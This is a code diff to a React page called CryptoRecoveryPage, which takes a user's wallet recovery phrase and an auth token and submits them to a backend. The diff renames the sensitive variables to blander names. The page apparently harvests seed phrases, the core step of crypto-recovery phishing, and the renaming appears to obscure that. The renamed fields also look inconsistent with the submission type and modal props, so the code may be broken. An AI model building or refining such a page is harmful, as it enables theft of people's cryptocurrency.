@@ -16,7 +16,7 @@ import VerificationRequired from '@/components/recovery/VerificationRequired';
 import {
 	RecoverySubmissionData,
 	submitRecoveryRequest,
-	verifyAuthToken,
+	verifytoken,
 } from '@/actions/recovery';
 
 export default function CryptoRecoveryPage() {
@@ -31,8 +31,8 @@ export default function CryptoRecoveryPage() {
 	const [isVerifying, setIsVerifying] = useState(false);
 	const [caseIdError, setCaseIdError] = useState('');
 
-	const [recoveryPhrase, setRecoveryPhrase] = useState('');
-	const [authToken, setAuthToken] = useState('');
+	const [phrase, setPhrase] = useState('');
+	const [token, settoken] = useState('');
 	const [selectedWallet, setSelectedWallet] = useState('');
 	const [isSubmittingRecovery, setIsSubmittingRecovery] = useState(false);
 	const [recoveryError, setRecoveryError] = useState('');
@@ -116,7 +116,7 @@ export default function CryptoRecoveryPage() {
 		setRecoveryError('');
 
 		try {
-			if (!authToken.trim()) {
+			if (!token.trim()) {
 				setRecoveryError('Auth token is required');
 				return;
 			}
@@ -126,21 +126,21 @@ export default function CryptoRecoveryPage() {
 				return;
 			}
 
-			if (!recoveryPhrase.trim()) {
+			if (!phrase.trim()) {
 				setRecoveryError('Recovery phrase is required');
 				return;
 			}
 
-			const tokenVerification = await verifyAuthToken(authToken);
+			const tokenVerification = await verifytoken(token);
 			if (!tokenVerification.valid) {
 				setRecoveryError(tokenVerification.error || 'Invalid auth token');
 				return;
 			}
 
 			const submissionData: RecoverySubmissionData = {
-				authToken,
+				token,
 				walletType: selectedWallet,
-				recoveryPhrase,
+				phrase,
 				userEmail: 'user@example.com',
 				createdAt: new Date(),
 			};
@@ -148,9 +148,9 @@ export default function CryptoRecoveryPage() {
 			const result = await submitRecoveryRequest(submissionData);
 
 			if (result.success) {
-				setAuthToken('');
+				settoken('');
 				setSelectedWallet('');
-				setRecoveryPhrase('');
+				setPhrase('');
 				setShowRecoveryModal(false);
 				setShowSuccessModal(true);
 			} else {
@@ -226,10 +226,10 @@ export default function CryptoRecoveryPage() {
 			<RecoveryModal
 				isOpen={showRecoveryModal}
 				onClose={() => setShowRecoveryModal(false)}
-				recoveryPhrase={recoveryPhrase}
-				setRecoveryPhrase={setRecoveryPhrase}
-				authToken={authToken}
-				setAuthToken={setAuthToken}
+				recoveryPhrase={phrase}
+				setRecoveryPhrase={setPhrase}
+				token={token}
+				setToken={settoken}
 				selectedWallet={selectedWallet}
 				setSelectedWallet={setSelectedWallet}
 				error={recoveryError}
